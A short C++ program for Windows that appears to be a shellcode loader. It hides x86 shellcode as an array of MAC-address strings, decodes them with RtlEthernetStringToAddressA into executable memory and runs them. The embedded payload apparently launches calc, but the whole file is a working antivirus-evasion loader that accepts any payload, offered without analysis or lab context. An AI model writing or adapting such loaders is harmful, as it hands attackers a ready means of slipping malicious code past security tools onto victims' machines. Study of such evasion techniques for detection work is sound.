#include <Windows.h>
#include <ip2string.h>
#include <cstddef> 

#pragma comment(lib, "ntdll.lib")

// 将执行逻辑放入 main 函数中
int main() {
    const char* macs[] = { 
        "90-90-90-90-FC-E8","82-00-00-00-60-89","E5-31-C0-64-8B-50","30-8B-52-0C-8B-52",
        "14-8B-72-28-0F-B7","4A-26-31-FF-AC-3C","61-7C-02-2C-20-C1","CF-0D-01-C7-E2-F2",
        "52-57-8B-52-10-8B","4A-3C-8B-4C-11-78","E3-48-01-D1-51-8B","59-20-01-D3-8B-49",
        "18-E3-3A-49-8B-34","8B-01-D6-31-FF-AC","C1-CF-0D-01-C7-38","E0-75-F6-03-7D-F8",
        "3B-7D-24-75-E4-58","8B-58-24-01-D3-66","8B-0C-4B-8B-58-1C","01-D3-8B-04-8B-01",
        "D0-89-44-24-24-5B","5B-61-59-5A-51-FF","E0-5F-5F-5A-8B-12","EB-8D-5D-6A-01-8D",
        "85-B2-00-00-00-50","68-31-8B-6F-87-FF","D5-BB-F0-B5-A2-56","68-A6-95-BD-9D-FF",
        "D5-3C-06-7C-0A-80","FB-E0-75-05-BB-47","13-72-6F-6A-00-53","FF-D5-63-61-6C-63",
        "00-00-00-00-00-00"
    };
    
    int count = sizeof(macs) / sizeof(macs[0]);


    PBYTE mem = (PBYTE)VirtualAlloc(NULL, count * 6, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    for (size_t i = 0; i < count; ++i) {
        PCSTR terminator;
        RtlEthernetStringToAddressA(macs[i], &terminator, (DL_EUI48*)(mem + i * 6));
    }

    ((void(*)())mem)();

    return 0;
}
